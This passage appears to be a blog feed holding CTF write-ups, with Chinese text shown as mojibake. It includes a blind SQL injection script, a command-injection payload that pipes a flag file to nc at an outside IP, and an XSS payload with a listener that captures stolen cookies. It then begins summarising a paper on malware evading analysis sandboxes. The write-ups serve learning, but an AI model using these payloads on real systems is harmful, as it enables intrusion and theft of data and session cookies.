class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"><span class="keyword">import</span> sys, math</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(query)</span>:</span></span><br><span class="line"> </span><br><span class="line">    data = parse.urlencode(&#123; <span class="string">'username'</span> : <span class="string">"') and if((%s),1,0) #"</span> % query &#125;).encode()</span><br><span class="line"> </span><br><span class="line">    req = request.Request(<span class="string">'http://3.16.68.122/smf/register.php'</span>, data = data)</span><br><span class="line">    req.get_method = <span class="keyword">lambda</span> : <span class="string">'POST'</span></span><br><span class="line">    res = request.urlopen(req).read().decode()</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> res.find(<span class="string">'User Not Registered'</span>) != <span class="number">-1</span>; <span class="comment"># means true</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greater_than_or_equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s &gt;= %d'</span> % (query, i));</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s = %d'</span> % (query, i));</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(query)</span>:</span></span><br><span class="line">    min_val = <span class="number">0</span></span><br><span class="line">    max_val = <span class="number">128</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">while</span> min_val + <span class="number">1</span> &lt; max_val:</span><br><span class="line">        mid = math.floor((min_val + max_val) / <span class="number">2</span>)</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> greater_than_or_equal(query, mid):</span><br><span class="line">            min_val = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_val = mid</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> equal(query, min_val):</span><br><span class="line">        <span class="keyword">return</span> search(query)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> min_val</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(query)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> search(<span class="string">'length((%s))'</span> % query)</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_and_print_content</span><span class="params">(query, length)</span>:</span></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        content += chr(search(<span class="string">'ord(substr((%s), %d, 1))'</span> % (query, i + <span class="number">1</span>)))</span><br><span class="line">        sys.stdout.write(<span class="string">'\r[%s] %s%s'</span> % (length, content, <span class="string">'_'</span> * (length - len(content))))</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    arg = <span class="string">' '</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line">     </span><br><span class="line">    content_len = get_length(arg)</span><br><span class="line">    get_and_print_content(arg, content_len)</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://posix.tistory.com/84" target="_blank" rel="noopener">https://posix.tistory.com/84</a></p><h2 id="0x03-PingService"><a href="#0x03-PingService" class="headerlink" title="0x03 PingService"></a>0x03 PingService</h2><p>æºç æ³„éœ²<code>http://3.17.167.161/PingService/helper.php~</code><br>é¢˜ç›®æºä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">"Unknown"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></span><br><span class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®cleanå‡½æ•°å¯ä»¥çœ‹å‡ºåº”è¯¥å¯èƒ½å­˜åœ¨blind rceã€‚æ ¹æ®getIPå‡½æ•°çš„å†…å®¹ï¼Œæˆ‘ä»¬é¦–å…ˆä¿®æ”¹X-Forwarder-Forå­—æ®µä¸º127.0.0.1ä¹‹åè¿”å›äº†æºä»£ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;helper.php&apos;);</span><br><span class="line">if (getIP() != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    die(&quot;Oye! This service is only for local client&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;login-screen&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;app-title&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Ping Service&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;login-form&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;control-group&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;login-field&quot; placeholder=&quot;8.8.8.8&quot; id=&quot;ip&quot; name=&quot;ip&quot;&gt;</span><br><span class="line">        &lt;label class=&quot;login-field-icon fui-user&quot; for=&quot;login-form&quot;&gt;&lt;/label&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-large btn-block&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt; </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;ip&apos;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;ip&apos;])) &#123;</span><br><span class="line">    $ip = $_POST[&apos;ip&apos;];</span><br><span class="line">    $ip = &apos;ping -c 1 &apos;.clean($ip);</span><br><span class="line">    $res = str_replace(&quot;\n&quot;, &quot;&lt;/br&gt;\n&quot;, shell_exec($ip));</span><br><span class="line">    if(strpos($res, &quot;100% packet loss&quot;)!==false)&#123;</span><br><span class="line">      echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:red&apos;&gt;Not Alive &lt;/h2&gt;&lt;/center&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:yellow&apos;&gt;Alive &lt;/h2&gt;&lt;/center&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»æºä»£ç ä¸Šå·²ç»ç¡®å®šæ˜¯rceçš„ä¸€ç§åˆ©ç”¨ï¼Œä»cleanå‡½æ•°ä¸­çœ‹åˆ°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>${IFS}</code>æ¥bypass</p><p>æœ€ç»ˆçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /PingService/ HTTP/1.1</span><br><span class="line">Host: 3.17.167.161</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://3.17.167.161/PingService/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">x-forwarded-for:127.0.0.1</span><br><span class="line"></span><br><span class="line">ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;47.90.204.28$&#123;IFS%?&#125;2233</span><br></pre></td></tr></table></figure><p>è¿”å›çš„ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'b00t2root&#123;mr.s74rk_1_d0nt_feel_s0_g00d&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-eXquisite-Scenery-Sites"><a href="#0x04-eXquisite-Scenery-Sites" class="headerlink" title="0x04 eXquisite Scenery Sites"></a>0x04 eXquisite Scenery Sites</h2><p>IPè½¬int<br><a href="http://www.bejson.com/convert/ip2int/" target="_blank" rel="noopener">http://www.bejson.com/convert/ip2int/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /Web-2/contact.php HTTP/1.1</span><br><span class="line">Host: 18.218.187.241</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://18.218.187.241/Web-2/contact.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=008185861a14c247da3b48a088fc8a75</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user=test&amp;Message=&lt;sCript&gt;document[&apos;location&apos;]=&apos;http://794479644:51/?&apos;%2Bdocument[&apos;cookie&apos;]&lt;/Script&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡ä½¿ç”¨ä¸€å¥è¯æœåŠ¡å™¨å´æ€ä¹ˆä¹Ÿæ¥å—ä¸åˆ°botå‘è¿‡æ¥çš„è¯·æ±‚ï¼Œä¹‹åä½¿ç”¨å¦‚ä¸‹è„šæœ¬å°±å¯ä»¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="comment"># blog : evilwing.me</span></span><br><span class="line"><span class="comment"># __Author__ : wing</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">xss = Flask(__name__)</span><br><span class="line"><span class="meta">@xss.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    flag = request.args</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> flag.items():</span><br><span class="line">        print(<span class="string">'Flag is:'</span> + j)</span><br><span class="line">    <span class="keyword">return</span> str()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    xss.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">51</span>)</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@zeros ~]# python xssflag.py</span><br><span class="line"> * Running on http://0.0.0.0:51/ (Press CTRL+C to quit)</span><br><span class="line">Flag is:b00t2root&#123;why_y0u_st34l_my_c00ki3s?&#125;; PHPSESSID=up8133i9r901kr52r93v5um0vf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;æ¯”èµ›åœ°å€: &lt;a href=&quot;http://3.17.26.191/&quot; target=&quot;_blank
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Spotless Sandboxes-&gt;Evading Malware Analysis Systems using Wear-and-Tear Artifacts</title>
    <link href="http://zer0yu.github.io/2019/03/20/Spotless-Sandboxes/"/>
    <id>http://zer0yu.github.io/2019/03/20/Spotless-Sandboxes/</id>
    <published>2019-03-20T07:38:10.000Z</published>
    <updated>2019-03-20T07:40:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‡ºå¤„ï¼š2017 IEEE Symposium on Security and Privacy (SP)<br>ä½œè€…ï¼šNajmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychronakis<br>å•ä½ï¼šStony Brook University<br>èµ„æ–™ï¼š<a href="https://ieeexplore.ieee.org/abstract/document/7958622" target="_blank" rel="noopener">Paper</a> </p><h2 id="1-Abstract-amp-INTRODUCTION"><a href="#1-Abstract-amp-INTRODUCTION" class="headerlink" title="1.Abstract &amp; INTRODUCTION"></a>1.Abstract &amp; INTRODUCTION</h2><p>åŠ¨æ€æ¶æ„ä»£ç åˆ†æç³»ç»Ÿé€šè¿‡å°†æ¯ä¸ªæ ·æœ¬åŠ è½½åˆ°ç§°ä¸ºæ²™ç®±çš„å¤§é‡ä»ªå™¨ç¯å¢ƒä¸­æ¥æ“ä½œï¼Œå¹¶ä»¥ä¸åŒçš„ç²’åº¦çº§åˆ«ï¼ˆä¾‹å¦‚ï¼ŒI/Oæ´»åŠ¨ï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œæœºå™¨æŒ‡ä»¤ï¼‰ç›‘è§†å…¶æ“ä½œã€‚ æ¶æ„è½¯ä»¶æ²™ç®±é€šå¸¸ä½¿ç”¨API hookingæœºåˆ¶ã€CPUä»¿çœŸå™¨ã€è™šæ‹Ÿæœºã€ç”šè‡³æ˜¯ä¸“ç”¨çš„è£¸æœºä¸»æœºæ¥æ„å»ºã€‚</p><p>æ”»å‡»è€…è§’åº¦:</p><ol><li>ä½¿ç”¨æ‰“åŒ…ã€å¤šæ€ä»¥åŠå…¶ä»–ä»£ç æ··æ·†æŠ€æœ¯è§„é¿åŸºäºé™æ€ä»£ç åˆ†æçš„æ¶æ„è½¯ä»¶æ‰«ææŠ€æœ¯ï¼›</li><li>åœ¨æ¶æ„è½¯ä»¶ä¸­åŠ å…¥ä¸€å®šçš„â€œç¯å¢ƒæ„ŸçŸ¥èƒ½åŠ›â€æ¥è§„é¿æ¶æ„è½¯ä»¶æ²™ç®±ç¯å¢ƒçš„åˆ†æ(åœ¨å‘ç°èº«å¤„æ²™ç®±ç¯å¢ƒåé‡‡ç”¨ç›´æ¥å´©æºƒæˆ–è€…å±•ç¤ºâ€œè‰¯æ€§â€è¡Œä¸º)ã€‚</li></ol><p>é˜²å¾¡è€…è§’åº¦:</p><ol><li>ä¸€èˆ¬è€Œè¨€ç”¨å®é™…å€¼æ›¿æ¢åˆ†æç¯å¢ƒçš„ç‰¹æœ‰å±æ€§å¹¶éšè—æ£€æµ‹å·¥å…·ï¼Œæ¥å°è¯•é¿å…è¢«æ¶æ„è½¯ä»¶æ„ŸçŸ¥ï¼›</li><li>é’ˆå¯¹ä½¿ç”¨ä»¿çœŸæˆ–è€…è™šæ‹ŸæŠ€æœ¯çš„äº§å“è€Œè¨€ï¼Œä½¿ç”¨æ¸…é™¤ç‰¹å®šçš„é©±åŠ¨ç¨‹åºã€è¿›ç¨‹ä»¥åŠå…¶å®ƒè™šæ‹ŸæŠ€æœ¯æŒ‡ç¤ºå™¨æ¥å®ç°é˜²è§„é¿ï¼›</li><li>ä½¿ç”¨è£¸æœº(åœ¨è¿›è¡Œä¸€å®šçš„éš”ç¦»åï¼Œç›´æ¥ä½¿ç”¨ç‰©ç†è®¡ç®—æœº)ã€‚</li></ol><p>é˜²å¾¡è€…è§’åº¦çš„é—®é¢˜ç¼ºé™·:</p><ol><li>ç”¨äºåˆ†æçš„æ“ä½œç³»ç»Ÿå‡ ä¹æ˜¯åŸå§‹çŠ¶æ€çš„ï¼›</li><li>æ¯æ¬¡è¿›è¡Œè¿‡äºŒè¿›åˆ¶åˆ†æä¹‹åå°±ä¼šå°†ç³»ç»Ÿå›æ»šè‡³æœ€åˆçŠ¶æ€(æµè§ˆå™¨è®°å½•ã€ç³»ç»Ÿæ—¥å¿—ç­‰ä¿¡æ¯å‡è¢«å›æ»š)ã€‚</li></ol><p>PS:ä»¥ä¸Šå†…å®¹ä¹‹æ‰€ä»¥è¯´æ˜¯ç¼ºé™·ï¼Œæ˜¯å› ä¸ºçœŸå®ç¯å¢ƒä¸­ç”¨æˆ·ä¸å¯èƒ½ä¸»åŠ¨å»å°†â€ç¼“å­˜â€(å¹¿ä¹‰ç¼“å­˜ï¼Œæ³›æŒ‡æ—¥å¿—ã€æ³¨å†Œè¡¨ç­‰)çš„è®°å½•è¿›è¡Œå›æ»šæˆ–è€…åˆå§‹åŒ–ã€‚</p><p>å› æ­¤åœ¨æœ¬æ–‡ä¸­ä½œè€…æå‡ºäº†ä¸€ç§åˆ©ç”¨æ“ä½œç³»ç»Ÿâ€œwear and tearâ€(ä½¿ç”¨ç—•è¿¹çš„å«ä¹‰ï¼Œåæ–‡ç®€ç§°ä¸ºç£¨æŸ)å’Œâ€œagingâ€(ä½¿ç”¨å¹´ä»½çš„å«ä¹‰ï¼Œåæ–‡ç®€ç§°ä¸ºè€åŒ–)çš„ç‰¹å¾æ¥è§„é¿sandbox(æ¶æ„è½¯ä»¶æ²™ç®±ç¯å¢ƒ)çš„æ–¹æ³•ã€‚</p><p>æœ¬æ–‡çš„ä¸¤é¡¹ç ”ç©¶æˆæœ:</p><ol><li>æ„å»ºå†³ç­–æ ‘æ¨¡å‹ï¼Œä½¿æ¶æ„è½¯ä»¶ç¨³å®šåœ°é¿å…æ‰€æœ‰ç»è¿‡æµ‹è¯•çš„æ²™ç®±çš„å‡†ç¡®ç‡æå‡è‡³92.86ï¼…ï¼›</li><li>æ„å»ºçš„ç»Ÿè®¡æ¨¡å‹å¯ä»¥æ ¹æ®ç³»ç»Ÿä½¿ç”¨æŒ‡æ ‡é¢„æµ‹ç³»ç»Ÿçš„å¹´é¾„ï¼Œå¹¶å¯ç”¨äºå°†ç°æœ‰çš„äººé€ æ²™ç®±â€œè€åŒ–â€åˆ°æ‰€éœ€çš„å¹´é™èŒƒå›´ã€‚</li></ol><h2 id="BACKGROUND-AND-RELATED-WORK"><a href="#BACKGROUND-AND-RELATED-WORK" class="headerlink" title="BACKGROUND AND RELATED WORK"></a>BACKGROUND AND RELATED WORK</h2><h3 id="A-Virtualization-and-Instrumentation-Artifacts"><a href="#A-Virtualization-and-Instrumentation-Artifacts" class="headerlink" title="A. Virtualization and Instrumentation Artifacts"></a>A. Virtualization and Instrumentation Artifacts</h3><ol><li>é˜²å¾¡è€…D: ä½¿ç”¨ç³»ç»Ÿä»¿çœŸå™¨å’Œè™šæ‹Ÿæœºæ„å»ºæ¶æ„è½¯ä»¶æ²™ç®±ååˆ†æ–¹ä¾¿</li><li>æ”»å‡»è€…A: ä½¿ç”¨é™æ€å¯å‘å¼æ£€æŸ¥æŸäº›ç³»ç»Ÿå±æ€§ï¼Œä¾‹å¦‚ç‰¹å®šäºVMçš„è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œç¡¬ä»¶é…ç½®ï¼Œå›ºå®šæ ‡è¯†ç¬¦ï¼ˆåŒ…æ‹¬MACåœ°å€ï¼‰ï¼ŒIMEIï¼ˆç”¨äºç§»åŠ¨æ¶æ„è½¯ä»¶åˆ†æç³»ç»Ÿï¼‰ï¼Œç”¨æˆ·/ä¸»æœºåï¼ŒVMç‰¹å®šåŠ è½½çš„æ¨¡å—å’Œæµç¨‹ï¼ˆä¾‹å¦‚VMwareçš„VMware Toolsï¼‰å’Œæ³¨å†Œè¡¨é¡¹ç­‰</li><li>é˜²å¾¡è€…D: é…ç½®åŠ¨æ€åˆ†æç³»ç»Ÿæ—¶ä»¥é¿å…å‡ºç°æœŸæœ›å€¼å’Œé…ç½®</li><li>æ”»å‡»è€…A: è¿™å¯¹è™šæ‹ŸåŒ–æŒ‡ä»¤çš„æ—¶åºå±æ€§ã€è¿è¡Œæ—¶ä½¿ç”¨å°ä»£ç ç‰‡æ®µç­‰åº•å±‚å±æ€§ä½œç”¨ä¸å¤§</li></ol><h3 id="B-Environmental-and-User-Interaction-Artifacts"><a href="#B-Environmental-and-User-Interaction-Artifacts" class="headerlink" title="B. Environmental and User Interaction Artifacts"></a>B. Environmental and User Interaction Artifacts</h3><p>é˜²å¾¡è€…D: æˆ‘çš„ä¸¤ç§æ–¹æ¡ˆ:</p><ol><li>åœ¨å¤šä¸ªä¸åŒçš„åˆ†æç³»ç»Ÿä¸Šè¿è¡Œæ¯ä¸ªæ ·æœ¬æ¥æ£€æµ‹æ¶æ„è½¯ä»¶çš„â€œåˆ†è£‚ä¸ªæ€§â€ï¼›</li><li>é¿å…å®Œå…¨ä½¿ç”¨ä»¿çœŸæˆ–è™šæ‹ŸåŒ–ï¼Œå¹¶é€‰æ‹©â€œè£¸æœºâ€ç³»ç»Ÿæ¥ä¿æŒåˆ†æç¯å¢ƒçš„çœŸå®æ€§ã€‚</li></ol><p>æ”»å‡»è€…A: 